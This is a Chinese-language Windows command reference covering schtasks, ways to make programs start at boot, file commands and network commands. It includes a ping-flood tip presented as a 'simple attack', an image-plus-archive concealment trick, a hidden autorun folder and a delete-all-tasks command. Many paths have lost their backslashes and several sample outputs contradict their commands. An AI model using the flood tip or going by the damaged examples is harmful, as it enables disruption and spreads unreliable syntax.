下面的命令计划 MyApp 程序在 2002 年 1 月 1 日午夜运行一次。它使用 /ru 参数指定以用户的 Administrator 帐户权限运行任务,使用 /rp 参数为 Administrator 帐户提供密码。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc once /st 00:00:00 /sd 01/01/2002 /ru Admin23 /rp p@ssworD1

7、schtasks create onstart
schtasks /create /tn TaskName /tr TaskRun /sc onstart [/sd StartDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | "System"} [/rpPassword]]

计划任务在每次系统启动的时候运行
下面的命令计划 MyApp 程序在每次系统启动的时候运行,起始日期是 2001 年 3 月 15 日。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc onstart /sd 03/15/2001

8、schtasks create onlogon
schtasks /create /tn TaskName /tr TaskRun /sc onlogon [/sd StartDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | "System"} [/rpPassword]]

计划任务在用户登录到远程计算机的时候运行
下面的命令计划批处理文件在用户(任何用户)每次登录到远程计算机上的时候运行。它使用 /s 参数指定远程计算机。因为命令是远程的,所以命令中所有的路径,包括批处理文件的路径,都指定为远程计算机上的路径。
schtasks /create /tn "Start Web Site" /tr c:myiiswebstart.bat /sc onlogon /s Server23

9、schtasks create onidle
schtasks /create /tn TaskName /tr TaskRun /sc onidle /iIdleTime [/sd StartDate] [/s computer [/u [domain]user /p password]] [/ru {[Domain]User | "System"} [/rpPassword]]

计划某项任务在计算机空闲的时候运行
下面的命令计划 MyApp 程序在计算机空闲的时候运行。它使用必需的 /i 参数指定在启动任务之前计算机必需持续空闲十分钟。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc onidle /i 10

创建以 System 权限运行的任务
下面的命令计划 MyApp 程序以 NT AuthoritySystem 帐户权限运行。在这个范例中,任务计划在每月的第一天运行,但对于以系统权限运行的任务可以使用所有的计划类型。
该命令使用 /ru "System" 参数指定系统安全上下文。因为系统任务不需要密码,所以忽略了 /rp 参数。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc monthly /d 1 /ru "System"
作为响应,SchTasks.exe 显示一个信息性消息和一个成功消息。它不提示输入密码。
 信息:此任务将被创建于用户名下 ("NT AUTHORITYSYSTEM")。
成功:计划任务 "My App" 已成功创建。

【 创建运行多个程序的任务 】
每个任务只能运行一个程序。但是可以创建一个运行多个程序的批处理文件,然后计划一个任务来运行该批处理文件。下面的过程说明了这个方法:

创建一个启动要运行程序的批处理文件。
在这个范例中创建了一个启动“事件查看器”(Eventvwr.exe) 和“系统监视器”(Perfmon.exe) 的批处理文件。

启动文本编辑器,例如“记事本”。 键入每个程序的名称和指向可执行文件的完全合格的路径。在这种情况下,文件包含有下列语句。
C:WindowsSystem32Eventvwr.exeC:WindowsSystem32Perfmon.exe

将文件存储为 MyApps.bat。 使用 SchTasks.exe 创建一个运行 MyApps.bat 的任务。
下面的命令创建了 Monitor 任务,每当有人登录它就运行。它使用 /tn 参数命名任务,使用 /tr 参数运行 MyApps.bat。它使用 /sc 参数来指明 OnLogon 计划类型,使用 /ru 参数指定 Administrator 帐户。

schtasks /create /tn Monitor /tr C:MyApps.bat /sc onlogon /ru ReskitAdministrator

该命令的结果是,每当用户登录到计算机,任务就启动“事件查看器”和“系统监视器”

【 更改计划任务 】
更改一个或多个下列任务属性。

任务运行的程序 (/tr)。 任务运行的用户帐户 (/ru)。 用户帐户的密码 (/rp)。
语法
schtasks /change /tn TaskName [/s computer [/u [domain]user /p password]] [/trTaskRun] [/ru [Domain]User | "System"] [/rp Password]

参数
/tn TaskName 标识要更改的任务。输入任务名。 /s Computer 指定远程计算机的名称或 IP 地址(带有或者没有反斜杠)。默认值是本地计算机。 /u [domain]user 使用特定用户帐户的权限运行命令。默认情况下,使用已登录到运行SchTasks 的计算机上的用户的权限运行命令。 /p password 指定在 /u 参数中指定的用户帐户的密码。如果使用 /u 参数,则需要该参数。 /tr TaskRun 更改任务运行的程序。输入可执行文件、脚本文件或批处理文件的完全合格的路径和文件名。如果忽略了路径,SchTasks.exe 假定文件在 SystemrootSystem32 目录下指定的程序替换任务最初运行的程序。 /ru [Domain]User | "System" 更改用于任务的用户帐户。
值说明

[domain]User指定用户帐户

"System" or ""指定为操作系统所使用的 NT AuthoritySystem 帐户。

在更改用户帐户的时候,必须也要更改用户密码。如果命令带有 /ru 参数,但没有 /rp 参数,SchTasks.exe 提示要求输入新的密码而且不显示键入的文本。

任务以不需要密码的 NT AuthoritySystem 帐户权限运行,SchTasks.exe 不会提示输入密码。

/p Password 更改用于任务的帐户密码。输入新的密码。 /? 在命令提示符显示帮助。
注释
XOX /tn 和 /s 参数标识该任务。/tr、/ru 和 /rp 参数指定可以更改的任务属性。 使用 change 操作的命令必须至少更改一个任务属性。 NT AuthoritySystem 帐户没有交互式登录权限。用户看不到以系统权限运行的程序,不能与其交互。
范例
更改任务运行的程序
下面的命令将 Virus Check 任务运行的程序由 VirusCheck.exe 更改为 VirusCheck2.exe。此命令使用 /tn 参数标识任务,使用 /tr 参数指定任务的新程序。(不能更改任务名称。)

schtasks /change /tn "Virus Check" /tr C:VirusCheck2.exe

作为响应,SchTasks.exe 显示以下成功消息:

成功:计划任务 "Virus Check" 的参数已更改。
此命令的结果是,Virus Check 任务现运行 VirusCheck2.exe。

更改远程任务的用户密码
下面的命令更改用于远程计算机 Svr01 上 RemindMe 任务的用户帐户密码。命令使用 /tn参数标识任务,使用 /s 参数指定远程计算机。它使用 /rp 参数指定新的密码 p@ssWord3。

在用户帐户密码过期或更改的时候需要此过程。如果存储在任务中的密码无效,那么任务不会运行。

schtasks /change /tn RemindMe /s Svr01 /rp p@ssWord3

作为响应,SchTasks.exe 显示以下成功消息:

成功:计划任务 "RemindMe" 的参数已更改。
这个命令的结果是,RemindMe 任务现在以其初始的用户帐户运行,但拥有一个新密码。

更改任务的程序和用户帐户
下面的命令更改任务运行的程序以及任务运行的用户帐户。实质上,它将旧的计划用于新的任务。这个命令将每天早上 9:00 a.m. 启动 "Notepad.exe" 的 Notepad 任务更改为启动"Internet Explorer" 浏览器。

该命令使用 /tn 参数来标识任务。它使用 /tr 参数更改任务运行的程序,使用 /ru 参数更改任务运行凭据的用户帐户。

忽略为用户帐户提供密码的 /rp 参数。必须为帐户提供密码,但可以使用 /rp 参数以及在明文中键入密码,或等待 SchTasks.exe 要求输入密码的提示,然后以不显示文本的方式输入密码。

schtasks /change /tn Notepad /tr "c:program filesInternet Exploreriexplore.exe" /ru DomainXAdmin01

作为响应,SchTasks.exe 索要用于用户帐户的密码。它不显示键入的文本,因此密码不可见。

Please enter the password for DomainXAdmin01: *********
请注意,/tn 参数标识任务,/tr 和 /ru 参数更改任务的属性。不能使用另外一个参数来标识任务,而且不能更改任务的名称。

作为响应,SchTasks.exe 显示以下成功消息:

成功:计划任务 "Notepad" 的参数已更改。
这个命令的结果是:RemindMe 任务现在以其初始的用户帐户运行,但拥有一个新密码。

将程序更改为 System 帐户
下面的命令更改了 SecurityScript 任务以使其以 NT AuthoritySystem 帐户权限运行。它使用 /ru "" 参数来表示 System 帐户。

schtasks /change /tn SecurityScript /ru ""

作为响应,SchTasks.exe 显示以下成功消息:

成功:计划任务 "SecurityScript" 的参数已更改。
因为任务以 System 帐户权限运行不需要密码,所以 SchTasks.exe 不提示输入密码。

【 schtasks run 】
立即运行计划任务,run操作忽略计划,但使用程序文件位置、用户帐户和存储在任务中的密码立即运行任务。

schtasks /run /tn TaskName [/s computer [/u [domain]user /p password]] /?

参数
/tn TaskName 标识任务。该参数是必需的。
/s Computer 指定远程计算机的名称或 IP 地址(带有或者没有反斜杠)。默认值是本地计算机。
/u [domain]user 使用特定用户帐户的权限运行命令。默认情况下,使用已登录到运行SchTasks 的计算机上的用户的权限运行命令。
/p password 指定在 /u 参数中指定的用户帐户的密码。如果使用 /u 参数,则需要该参数。 /? 在命令提示符显示帮助。

使用这个操作来测试任务。如果任务没有运行,请检查“任务计划程序服务”事务日志SystemrootSchedLgU.txt以获取错误。 运行任务不会影响任务计划,不会更改为任务计划好的下次运行时间。要远程运行任务必须在远程计算机上计划任务。在运行该任务时它仅在远程计算机上运行。要验证任务正在远程计算机上运行,请使用“任务管理器”或“任务计划程序”事务日志SystemrootSchedLgU.txt。

在本地计算机上运行任务
下面的命令启动 "Security Script" 任务。
schtasks /run /tn "Security Script"
作为响应,SchTasks.exe 启动与任务相关联的脚本并显示以下消息:
成功:计划任务 "Security Script" 正在运行 ...

在远程计算机上运行任务
下面的命令在远程计算机 Svr01 上运行 Update 任务:
schtasks /run /tn Update /s Svr01
此时,SchTasks.exe 显示以下错误消息:
错误:无法运行计划任务 "Update"。
查看 Svr01 上的 “计划任务程序”事务日志C:WindowsSchedLgU.txt以获取错误的原因。在这种情况下,日志中显示以下条目:
 "Update.job" (update.exe) 3/26/2001 1:15:46 PM ** ERROR **
The attempt to log on to the account associated with the task failed, therefore, the task did not run.
 The specific error is
0x8007052e:Logon failure:unknown user name or bad password.
Verify that the task's Run-as name and password are valid and try again.
显然,任务中的用户名或密码在此系统中无效。

下面的 schtasks /change 命令为 Svr01 上的 Update 任务更新用户名和密码:
schtasks /change /tn Update /s Svr01 /ru Administrator /rp PassW@rd3
在 change 命令完成之后,重新运行 run 命令。这一次,Update.exe 程序启动,SchTasks.exe 显示以下消息:
错误:无法运行计划任务 "Update"。

【 schtasks end 】
终止由任务启动的程序,SchTasks.exe只终止由计划任务启动的程序实例,要终止其它程序请使用TaskKill
schtasks /end /tn TaskName [/s computer [/u [domain]user /p password]] /?

参数
/tn TaskName 标识启动程序的任务,该参数是必需的。
/s Computer 指定远程计算机(带有或者没有反斜杠)的名称或 IP 地址。默认值是本地计算机。
/u [domain]user 使用特定用户帐户的权限运行命令。默认情况下,使用已登录到运行SchTasks 的计算机上的用户的权限运行命令。
/p password 指定在 /u 参数中指定的用户帐户的密码。如果使用 /u 参数,则需要该参数。 /? 显示帮助。

终止本地计算机上的任务
下面的命令终止由My Notepad任务启动的Notepad实例:
schtasks /end /tn "My Notepad"
作为响应,SchTasks.exe 终止了由任务启动的 Notepad 实例并显示以下成功消息:
成功:计划任务 "My Notepad" 已成功终止。

终止远程计算机上的任务
下面的命令终止远程计算机Svr01上由InternetOn任务启动的Internet Explorer实例:
schtasks /end /tn InternetOn /s Svr01
作为响应,SchTasks.exe停止由任务启动的Internet Explorer实例并显示以下成功消息:
成功:计划任务 "Update" 正在运行...

【 schtasks delete 】
delete操作从计划表中删除计划任务,它不删除任务运行的程序或中断正在运行的程序。
delete * 命令删除所有为计算机计划的任务,而不是仅删除由当前用户计划的任务。

schtasks /delete /tn {TaskName | *} [/f] [/s computer [/u [domain]user /ppassword]] [/?]

参数
/tn {TaskName | *} 标识要删除的任务,该参数是必需的。TaskName删除已命名任务。*删除计算机上的所有计划任务。
/f 阻止确认消息,不警告就删除任务。
/s Computer 指定远程计算机的名称或IP地址(带有或者没有反斜杠),默认值是本地计算机。
/u [domain]user 使用特定用户帐户的权限运行命令。默认使用已登录到运行SchTasks的计算机上的用户的权限运行命令。
/p password 指定在/u参数中指定的用户帐户的密码。如果使用/u参数则需要该参数。
/? 在命令提示符显示帮助。

从远程计算机上的计划表中删除任务
下面的命令从远程计算机上的计划表中删除"Start Mail"任务,使用/s参数来标识远程计算机。
schtasks /delete /tn "Start Mail" /s Svr16
作为响应, SchTasks.exe显示以下确认消息。要删除任务,请键入y。要取消命令,请键入n:
警告您确定要删除任务 "Start Mail" 吗 (Y/N )? y 成功:已成功删除计划任务 "Start Mail"。

删除所有为本地计算机计划的任务,包括由其它用户计划的任务,使用/tn *参数代表计算机上所有的任务,使用/f参数取消确认消息。
schtasks /delete /tn * /f
作为响应,SchTasks.exe显示以下成功消息以表明只删除了计划任务SecureScript。
成功:计划任务 "SecureScript" 已成功删除。

【 schtasks query 】
显示计划在计算机上运行的所有任务,包括那些由其它用户计划的任务。

schtasks [/query] [/fo {TABLE | LIST | CSV}] [/nh] [/v] [/s computer [/u[domain]user /p password]]

参数
[/query] 操作名称可选,键入不带任何参数的schtasks来执行查询。
/fo {TABLE|LIST|CSV} 指定输出格式,默认TABLE
/nh 忽略表格显示中的列标题,此参数与TABLE和CSV输出格式共同使用时有效。
/v 将任务的高级属性添加到显示中,使用/v的查询应该格式化成LIST或CSV
/s Computer 指定远程计算机的名称或IP地址(带有或者没有反斜杠)默认值是本地计算机。
/u [domain]user 使用特定用户帐户的权限运行命令,默认使用已登录到运行SchTasks的计算机上的用户的权限运行命令。
/p password 指定在/u参数中指定的用户帐户的密码,如果使用/u参数则需要该参数。
/? 在命令提示符显示帮助。

下面的命令显示为本地计算机计划的所有任务。这些命令得到的结果相同,并可以交换使用。
schtasks
schtasks /query

作为响应SchTasks.exe以默认的简单表格格式显示任务:
 TaskName                  Next Run Time             Status
========================= ======================== ==============
Microsoft Outlook         At logon time
SecureScript              14:42:00 PM , 2/4/2001

显示计划任务的高级属性
下面的命令要求详细的显示本地计算机上的任务。它使用 /v 参数来请求详细显示,使用/fo LIST 参数来将显示格式化成易于阅读的列表。这个命令可以用来验证创建的任务有预期的循环模式。

schtasks /query /fo LIST /v
作为响应,SchTasks.exe显示所有任务的详细属性列表。下面的显示给出了一个计划在每月最后一个周五的4:00 A.M.运行的任务的列表:

HostName:RESKIT01
TaskName:SecureScript
Next Run Time:4:00:00 AM , 3/30/2001
Status:Not yet run
Last Run Time:Never
Last Result:                               0
Creator:user01
Schedule:At 4:00 AM on the last Fri of every month, starting 3/24/2001
 Task To Run:: C:WINDOWSsystem32
otepad.exe
 Start In:notepad.exe
 Comment:N/A
 Scheduled Task State:Enabled
Scheduled Type:Monthly
Modifier:Last FRIDAY
Start Time4:00:00 AM
Start Date:                                3/24/2001
End Date:N/A
Days:FRIDAY
Months:JAN、FEB、MAR、APR、MAY、JUN、JUL、AUG、SEP、OCT、NOV、DEC
Run As User:RESKITuser01
Delete Task If Not Rescheduled:Enabled
Stop Task If Runs X Hours and X Mins:      72:0
Repeat:Until Time:Disabled
Repeat:Repeat:Disabled
Repeat:Stop If Still Running: Disabled
Idle: Start Time(For IDLE Scheduled Type): Disabled
Idle: Only Start If Idle for X Minutes: Disabled
Idle:If Not Idle Retry For X Minutes: Disabled
Idle: Stop Task If Idle State End: Disabled
Power Mgmt: No Start On Batteries: Disabled
Power Mgmt:Stop On Battery Mode: Disabled

将为远程计算机计划的任务记入日志
下面的命令请求为远程计算机计划的任务列表,并将任务添加到本地计算机中以逗号分隔的日志文件中。此命令的格式可以用来收集和跟踪为多个计算机计划的任务。

命令使用/s参数标识远程计算机Reskit16,使用/fo参数指定格式,使用/nh参数取消列标题。>>附加符号将输出重定向到本地计算机Svr01上的任务日志p0102.csv。因为命令在远程计算机上运行,所以本地计算机路径必须是完全合格的。

schtasks /query /s Reskit16 /fo csv /nh >> svr01data asklogsp0102.csv
作为响应,SchTasks.exe会把为计算机Reskit16计划的任务添加到本地计算机Svr01上的p0102.csv文件中。

命令行创建的计划任务有空格而不能创建的情况的解决方案:在含有看空格的参数或则路径前面加上 "  进行转义
schtasks /create /sc minute /mo 30 /tn "finaltest" /tr "d:program filesmth.bat" "'20' '302'"

</pre>

<h4>Win10添加开机启动项,添加开机自动运行软件三种方法</h4><pre>
方法一:开机启动文件夹
1、打开文件夹:C:\Users(用户)\Administrator(当前用户名)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs(「开始」菜单)\Programs(程序)\Startup(启动 )即可找到启动文件夹
也可以在运行中粘贴以下路径回车打开
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

2、然后把软件的快捷方式或文件放到该启动文件夹中,Win10开机后就可以自动运行了。

方法二:注册表添加启动项
1、打开运行输入regedit打开注册表。
2、在注册表中找到如下位置HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,右键“Run”新建一个字符串类型的键值
3、右键新建的键值,选择修改,将数值名称改为要启动的程序名称如:ctfmon.exe,数值数据改为程序所在位置的路径 如:C:\windows\system32\ctfmon.exe (直接不能修改名字的,可以先点击重命名,改好名字,再点击修改,修改数值数据
4、最后再重新启动win10你设置的程序就可以在Win10开机后自己启动了

方法三:任务计划程序
1、在“我的电脑”-》“右键”-》“管理”
2、这时会打开任务计划程序,右边有一个创建基本任务和一个创建任务,先点开创建基本任务
3、选择什么时候触发,可以选择什么时候开始执行,可选择用户登录时就是开机输入密码登录后就执行,然后下一步。
5、选择一个操作,小编选择启动程序,然后选择一个批处理,如果批处理不用传参,可选参数就不管了,直接下一步完成

</pre>
</div>

<div id="filedoscmd">
<h4>dos文件操作命令</h4><pre>
【 cd命令(chdir) 】
盘符:  将工作目录转到指定的盘.(有记忆功能)
c:  访问C盘

change directory切换目录,显示当前目录的名称或将其更改
cd
cd foldersname 进入访问文件夹
cd C:\  切换进入C盘
cd.. 返回上层目录

\d参数:除了改变驱动器的当前目录之外,还可改变当前驱动器
cd \d E:/wamp64/www/study/

查看当前路径(pwd)
linux下查看当前路径的命令为pwd,
windows下为%cd%

【 pushd命令和popd命令 】
切换当前目录

pushd命令保存当前目录,然后对其进行更改
popd命令还原通过PUSHD保存的当前目录的上一个值

@echo off
c: & cd\ & md mp3    #在 C:\ 建立 mp3 文件夹
md d:\mp4            #在 D:\ 建立 mp4 文件夹
cd /d d:\mp4         #更改当前目录为 d:\mp4
pushd c:\mp3         #保存当前目录,并切换当前目录为 c:\mp3
popd                 #恢复当前目录为刚才保存的 d:\mp4

Pushd和Popd命令,这两个命令一般都是同时使用,意思就是Push和Pop

Pushd命令改变当前目录到指定目录,并保存当前的目录在堆栈顶端
Popd命令改变当前目录,跳转到堆栈顶端保存的目录,并将堆栈顶端的目录删除

使用Pushd命令后就会将当前目录储存到一个虚拟堆栈中,如果第一次使用Pushd命令,该命令所在的目录就会被置于栈底,如再次使用该命令,则第二个目录就会被置于第一个目录之上。

使用Popd命令,将当前目录更改为最近由Pushd命令存储的目录,并位于堆栈顶端的目录将从堆栈中删除。

@Echo Off
Echo 当前目录：%cd%
pushd C:\Intel\Logs
Echo 当前目录：%cd%
pushd C:\Download
Echo 当前目录：%cd%
pushd C:\WINDOWS

Echo 当前目录：%cd%
popd
Echo 当前目录：%cd%
popd
Echo 当前目录：%cd%
popd
Echo 当前目录：%cd%
Pause

【 dir命令 】
查看目录下的文件和子目录列表
dir          查看当前目录下的文件和子目录列表
dir .\list   查看指定目录下的文件和子目录列表
dir *.exe    查看目录下的可执行文件
dir /P       分屏显示,逐页翻页
dir /s       显示指定目录和所有子目录中的文件
dir /b       只显示文件名或目录名
dir /ad      /a显示具有指定属性的文件,d只显示目录
dir /a-d     /a显示具有指定属性的文件,-表示否,-d只显示文件

【 tree命令 】
以图形方式显示驱动程序或路径的目录树形结构
tree>d:\a.txt 将目录的树形结构写入d盘的文本

【 mklink命令 】
创建符号链接和硬链接

【 md命令、mkdir命令 】
md(mkdir) abc     新建abc目录/文件夹
mkdir \a\b\c\d
md one two three  批量新建文件夹

【 erase 】
删除一个或多个文件

【 del命令 】
删除一个或多个文件,通配符可被用来删除多个文件
del /P     删除每一个文件之前提示确认

【 rd命令、rmdir命令 】
删除一个目录,以管理员身份运行
rd(rmdir) [/S] [/Q] [drive:]path
/S 除目录本身外,还将删除指定目录下的所有子目录和文件。用于删除目录树。
/Q 安静模式,带/S删除目录树时不要求确认

【 ren命令 rename命令 】
重命名文件,支持对文件名和目录名的修改

【 replace命令 】
替换文件

【 find命令、findstr命令 】
find 在一个或多个文件中搜索一个文本字符串
findstr 在多个文件中搜索字符串
find可以读取Unicode格式的文本,而findstr则不行
find 无正则,findstr 默认正则

find 参数 "字符串" 路径\文件名
参数：
/V 显示所有未包含指定字符串的行。fsutil fsinfo drives|find /v "" 过滤某些特殊字符
/C 统计含指定字符串的总行数。find /c "abc" test.txt统计test.txt中含有字符串abc的总行数,findstr要配合for语句才能实现
/N 显示行号。
/I 搜索字符串时忽略大小写,默认区分大小写
/OFF[LINE] 不要跳过具有脱机属性集的文件。

当文件中包含要查找的字符串时返回这个字符串所在位置的整行内容
find /v "Abc" test.txt  查找那些不含字符串Abc的行
find /i /v "Abc" test.txt  不区分大小写
find "1" *.txt  find支持查找通配符文件

findstr是find的扩展,功能更强大
findstr 参数 字符串 路径\文件名
参数：
/B 在一行的开始配对模式begin
/E 在一行的结尾配对模式end
/L 按字使用搜索字符串,就是将后面的""里的当成一个字符
/R 将搜索字符串作为一般表达式使用。
/S 在当前目录和所有子目录中搜索匹配文件。
/I 指定搜索不分大小写ignore
/X 打印完全匹配的行。/x是指完全匹配,就是说整行匹配,而不是含有关键字
/V 只打印不包含匹配的行,就是找出不包含字符串的
/N 在匹配的每行前打印行数,就是在输出行的前面加上原文件中的行数number
/M 如果文件含有匹配项,只打印其文件名,即指定文件中输出含有字符串的文件名
/O 在每个匹配行前打印字符偏移量,告诉每行第一个字符前的位置是该文件中的第几个字节,文本中不可见的回车符合换行符将占两字节,某些文本中只占一字节,空格键一个字符。
/P 忽略有不可打印字符的文件
/C:string 使用指定字符串作为文字搜索字符串,findstr /c:"a b" 1.txt找出含"a b"的行并输出来,否则输出含有字母a或b的行
/G:file 从指定的文件获得搜索字符串,findstr /g:2.txt 1.txt把1.txt中含有2.txt中任一行内容的行输出来。
/A:attr 指定有十六进位数字的颜色属性。请见 "color /?"
/F:file 从指定文件读文件列表
/D:dir 查找以分号为分隔符的目录列表
/OFF[LINE] 不跳过带有脱机属性集的文件。

findstr命令中正则表达式的用法规则:
. 通配符: 任何字符,findstr . 2.txt 或 findstr "." 2.txt 从文件2.txt中查找任意字符,不包括空字符或空行
* 重复: 以前字符或类别出现零或零以上次数,findstr .* 2.txt 或 findstr ".*" 2.txt 从文件2.txt中查找任意字符包括空行和空字符
^ 行位置: 行的开始
$ 行位置: 行的终点
[class] 字符类别: 任何在字符集中的字符,findstr "[0-9]" 2.txt findstr "[a-zA-Z]" 2.txt findstr "[a-fl-z]" 2.txt
[^class] 补字符类别: 任何不在字符集中的字符,findstr "M[abc][hig]Y" 2.txt finstr "[^0-9]" 2.txt
[x-y] 范围: 在指定范围内的任何字符
\x Escape: 元字符 x 的文字用法
\＜xyz 字位置: (单词)字的开始
xyz\> 字位置: (单词)字的结束
findstr "cd\>" 1.txt只要求连在一起的并以cd结尾的单词,不要求是行尾
echo hello world computer|findstr "\＜computer\>"这样的形式
echo hello worldcomputer|findstr ".*computer\>"这样就可以匹配了

netstat -ano|findstr "80"           # 查看80端口
sc query | findstr /IR ".*push.*"   # 用一般表达式查找包含push的行,忽略大小写
findstr "hello there" x.y           # 在文件x.y中寻找 "hello" 或 "there"。
findstr /C:"hello there" x.y        # 在文件x.y中寻找"hello there"

【 comp命令 】
比较两个或两套文件的内容大小是否相同

【 fc命令 】
比较两个文件或两个文件集并显示它们之间的不同

FC [/A] [/C] [/L] [/LBn] [/N] [/OFF[LINE]] [/T] [/U] [/W] [/nnnn]
   [drive1:][path1]filename1 [drive2:][path2]filename2
FC /B [drive1:][path1]filename1 [drive2:][path2]filename2

/A         只显示每个不同处的第一行和最后一行。
/B         执行二进制比较。
/C         不分大小写。
/L         将文件作为 ASCII 文字比较。
/LBn       将连续不匹配的最大值设置为指定的行数。
/N         在 ASCII 比较上显示行数。
/OFF[LINE] 不要跳过带有脱机属性集的文件。
/T         不要将制表符扩充到空格。
/U         将文件作为 UNICODE 文本文件比较。
/W         为了比较而压缩空白(制表符和空格)。
/nnnn      指定不匹配处后必须连续匹配的行数。
[drive1:][path1]filename1  指定要比较的第一个文件或第一个文件集。
[drive2:][path2]filename2  指定要比较的第二个文件或第二个文件集。

【 copy命令 】
复制文件,但不能复制文件夹,使用该命令进行文件拷贝时目的目录一定要存在
COPY [/D] [/V] [/N] [/Y | /-Y] [/Z] [/L] [/A | /B ] source [/A | /B]
     [+ source [/A | /B] [+ ...]] [destination [/A | /B]]

source       指定要复制的文件
/A           表示一个ASCII文本文件
/B           表示一个二进位文件
/D           允许解密要创建的目标文件
destination  为新文件指定目录和/或文件名
/V           验证新文件写入是否正确
/N           复制带有非 8dot3 名称的文件时,尽可能使用短文件名
/Y           不使用确认是否要覆盖现有目标文件的提示
/-Y          使用确认是否要覆盖现有目标文件的提示
/Z           用可重新启动模式复制已联网的文件
/L           如果源是符号链接,请将链接复制到目标而不是源链接指向的实际文件

要附加文件,请为目标指定一个文件,为源指定数个文件(用通配符或file1+file2+file3格式)

copy d:\test\test.txt d:\                默认覆盖存在的同名文件
copy /y d:\test\test.txt d:\             /y即yes,即覆盖存在的同名文件
copy d:\test\test.txt d:\1.txt           指定新文件的文件名
copy "d:\test abc\test.txt" "d:\t&est"   要复制的文件路径文件名中有空格&等特殊字符需要引号
copy d:\test.txt+d:\abc.txt d:\test\test.txt 合并多个文件为一个新文件
copy d:\test\aaa d:\test\ccc             复制aaa文件夹下多个文件
copy d:\test\test.txt d:\test\new.txt    复制到相同路径下
copy /b  F:\f\*.ts  E:\f\new.ts          复制合并ts文件

copy /b 1.jpg+2.rar new.jpg               将1.jpg+2.rar合成新图片文件,1.jpg作为封面,改后缀为rar解压即可还原

【 XCOPY命令】
在cmd下复制"文件夹"需要使用xcopy,复制文件使用copy
拷贝复制文件和目录树,该命令在COPY的基础上进行了加强,能够对多个子目录进行拷贝。它的参数比较多,最常用的是"/S",它可以对一个目录下属的多个子目录进行拷贝,另外"/E"可以拷贝空目录。
XCOPY [源路径][源目录/文件名] [目的目录/文件名] [参数]
xcopy Filepath1\*.* Filepath2\ /s/y
xcopy Filepath1\*.* Filepath2\ /E
xcopy Filepath1\test.txt Filepath2\

【 robocopy命令 】
复制文件和目录树的高级实用工具

【 discopy命令 】
磁盘复制,复制出一个和原来磁盘内容一模一样的磁盘,主要用途就是用来备份
diskcopy　源驱动器名　目的驱动器名

【 move命令 】
将一个或多个文件从一个目录移动到另一个目录,或重命名
MOVE [源文件] [目的路径]

【 more命令 】
逐屏显示输出
dir /r | more

【 type命令 】
显示文本文件的内容
type c:\read\readme.txt   // 查看文本文件的内容

【 assoc命令和ftype命令 】
assoc命令显示或修改文件扩展名关联
ftype命令显示或修改在文件扩展名关联中使用的文件类型

文件关联
双击一个.txt文件时windows并不是根据.txt直接判断用notepad.exe打开,而是先判断.txt属于txtfile文件类型,再调用txtfile关联的命令行txtfile=%SystemRoot%\system32\NOTEPAD.EXE %1
可以在'文件夹选项'→'文件类型'里修改这2种关联

assoc设置'文件扩展名'关联,关联到'文件类型'
ftype设置'文件类型'关联,关联到'执行程序和参数'

assoc          #显示所有'文件扩展名'关联
assoc .txt     #显示.txt代表的'文件类型',结果显示 .txt=txtfile
assoc .doc     #显示.doc代表的'文件类型',结果显示 .doc=Word.Document.8
assoc .exe     #显示.exe代表的'文件类型',结果显示 .exe=exefile

ftype          #显示所有'文件类型'关联
ftype txtfile
ftype exefile  #显示exefile类型关联的命令行,结果显示 exefile='%1' %*

assoc .txt=Word.Document.8   // 设置.txt为word类型的文档,可以看到.txt文件的图标都变了
assoc .txt=txtfile           // 恢复.txt的正确关联

ftype exefile='%1' %*        // 如果该关联已经被破坏,可以运行cmd输入这条命令恢复exefile的正确关联

【 attrib命令 】
显示或更改文件属性,文件的属性有只读、隐藏、系统、存档和无内容索引等5个

ATTRIB [+R|-R] [+A|-A] [+S|-S] [+H|-H] [[drive:] [path] filename] [/S [/D]]
+ 设置属性
- 清除属性
R 只读文件属性
A 存档文件属性
S 系统文件属性
H 隐藏文件属性
[drive:][path][filename]  指定要处理的文件属性。
/S 处理当前文件夹及其子文件夹中的匹配文件。
/D 也处理文件夹。

echo xxxx>1.txt  写入文件
attrib 1.txt     查看1.txt文件的属性
attrib +h 1.txt  隐藏文件
attrib -h 1.txt  隐藏文件

建立文件夹autorun,然后将其设为存档、系统、隐藏属性
md autorun
attrib +a +s +h autorun

【 expand命令 】
展开一个或多个压缩文件

EXPAND [-R] Source Destination
EXPAND -R Source [Destination]
EXPAND -I Source [Destination]
EXPAND -D Source.cab [-F:Files]
EXPAND Source.cab -F:Files Destination

-R            重命名展开的文件。
-I            重命名展开的文件但忽略目录结构。
-D            显示来源中的文件列表。
Source        源文件规格。可使用通配字符。
-F:Files      从.CAB文件展开的文件的名称。
Destination   目标文件 | 路径规格。目标可以是目录。如果来源是多个文件且没有指定-r,目标则必须是目录

</pre>
</div>

<div id="networkdoscmd">
<h3>dos网络命令</h3><pre>
【 nslookup命令 】
显示ip地址

>nslookup
默认服务器:  UnKnown
Address:  192.168.43.1

【 ipconfig命令 】
IP配置查询命令,用来查看和修改网络中的TCP/IP协议的有关配置等
ipconfig /all  显示所有TCP/IP的细节信息,包括测试主机名,IP地址,mac地址,子网掩码,节点类型等等
ipconfig /displaydns 查询DNS缓存信息
ipconfig /flushdns 刷新DNS解析缓存

mac地址,物理地址
74-DF-BF-39-85-FF
网络适配器->右键状态->详细信息

【 ping命令 】
ping 192.168.0.1    ping网关地址,检测自己的网络是否正常,和路由器的链接是否正常
ping www.baidu.com  ping服务器地址,检测和主机的网络连接是否正常,可以得到主机的IP

用来检查网络是否通畅或网络连接速度的命令
原理:网络上的机器都有唯一确定的IP地址,给目标IP地址发送一个数据包,对方就要返回一个同样大小的数据包,根据返回的数据包可以确定目标主机的存在,可以初步判断目标主机的操作系统等。

ping /? 回车
-t 不间断向目标IP发送数据包直到强迫其停止。如果使用100M的宽带接入,而目标IP是56K的小猫,不久目标IP就承受不了这么多的数据而掉线,一次简单攻击实现了　

-l 定义发送数据包的大小,默认32字节,利用它可以最大定义到65500字节,结合-t参数一起使用会有更好的效果

-n 定义向目标IP发送数据包的次数,默认3次。如果网速比较慢,3次也浪费了不少时间,因为现在目的仅是判断目标IP是否存在一次即可
